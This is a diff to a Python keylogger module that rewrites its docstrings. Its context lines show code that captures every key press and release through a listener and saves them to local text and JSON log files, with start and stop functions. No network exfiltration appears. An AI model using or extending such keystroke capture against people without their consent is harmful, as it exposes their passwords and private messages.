@@ -17,24 +17,37 @@ keys: str = ""
 
 def generate_text_log(key: _Any) -> None:
     """
-    def generate_text_log(key: Any) -> None:
-        Generate the logs in .txt format
+    Generates a text log file containing the recorded keystrokes.
+
+    Args:
+        key (Any): The keystroke data to write into the log file.
     """
+    
     with open("./out/key_log.txt", "w+") as KEYS:
         KEYS.write(key)
 
 
 def generate_json_file(used_keys: _Any) -> None:
     """
-    def generate_json_file(used_keys: Any) -> None:
-        Generate the logs in .json format
+    Generates a JSON log file with keystroke events.
+
+    Args:
+        used_keys (Any): A list of key events to log in JSON format.
     """
+    
     with open("./out/key_log.json", "+wb") as key_log:
         key_list_bytes = _json.dumps(used_keys).encode()
         key_log.write(key_list_bytes)
 
 
 def on_press(key: _Any) -> None:
+    """
+    Handles key press events, logging the pressed or held keys.
+
+    Args:
+        key (Any): The key that was pressed.
+    """
+    
     global flag, keys_used, keys
     if not flag:
         keys_used.append({"Pressed": f"{key}"})
@@ -46,6 +59,13 @@ def on_press(key: _Any) -> None:
 
 
 def on_release(key: _Any) -> None:
+    """
+    Handles key release events and updates log files.
+
+    Args:
+        key (Any): The key that was released.
+    """
+    
     global flag, keys_used, keys
     keys_used.append({"Released": f"{key}"})
 
@@ -62,8 +82,7 @@ _LISTENER = _keyboard.Listener(on_press=on_press, on_release=on_release)
 
 def start_keylogger():
     """
-    def start_keylogger() -> None:
-        Starts the keylogger's instance
+    Initiates the keylogger, enabling keystroke logging.
     """
 
     listener = _LISTENER
@@ -77,9 +96,9 @@ def start_keylogger():
 
 def stop_keylogger():
     """
-    def stop_keylogger() -> None:
-        Stops the keylogger's instance
+    Stops the keylogger, halting keystroke logging.
     """
+
 
     listener = _LISTENER
     listener.stop()
